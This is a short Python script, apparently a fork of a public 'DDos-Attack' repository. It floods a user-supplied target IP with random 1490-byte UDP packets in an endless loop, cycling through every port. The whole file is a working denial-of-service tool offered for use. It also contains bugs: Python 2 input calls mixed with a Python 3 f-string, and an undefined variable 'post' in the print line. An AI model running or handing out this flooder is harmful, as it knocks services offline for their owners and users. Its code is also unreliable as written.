import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("clear")
os.system("figlet DDos Attack")
print("Author   : HA-MRX")
print("Change By: YIJANGs")
print("Fork From : https://github.com/Ha3MrX/DDos-Attack")

print()
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack Starting")

sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print(f"Sent {sent} packet to {ip} throught port: {post}")
     if port == 65534:
          port = 1

